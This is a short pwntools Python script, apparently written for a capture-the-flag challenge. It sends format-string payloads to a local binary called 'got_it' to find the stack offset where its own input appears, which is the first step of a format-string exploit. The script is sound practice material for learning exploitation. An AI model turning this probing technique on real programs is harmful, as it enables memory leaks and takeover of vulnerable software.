#!/usr/bin/python3

from pwn import *

def scanit(t):
	p = process('./got_it')
	#p = remote('pwn.hsctf.com', 5004)
	p.recvuntil('Give me sumpfink to help me out!\n')
	p.sendline(t)
	_ =  p.recvuntil('worked').split()[-2].split(b'"')[1]
	p.close()
	return _
	

for i in range(1,20):
	t = '%' + str(i).rjust(2,'0') + '$018p'
	_ = scanit(t)
	print(i,_)
	if _.find(b'0x') >= 0:
		s = bytes.fromhex(_[2:].decode())[::-1]
		if s == t.encode():
			print('base:',i)
			break
		
